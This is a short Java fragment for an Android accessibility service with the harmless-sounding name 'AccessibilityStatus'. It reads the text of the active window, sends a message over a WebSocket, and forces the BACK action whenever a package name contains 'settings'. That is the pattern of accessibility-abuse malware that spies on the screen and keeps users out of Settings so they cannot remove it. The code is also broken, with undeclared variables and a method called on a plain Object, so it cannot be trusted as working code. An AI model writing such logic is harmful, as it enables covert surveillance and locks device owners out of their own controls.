import android.accessibilityservice.AccessibilityService;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
class AccessibilityStatus extends AccessibilityService {
  void report() {
    Object root = getRootInActiveWindow();
    CharSequence txt = root.getText();
    dataSocket.send("ready");
    if (pkg.contains("settings")) {
      performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
    }
  }
}
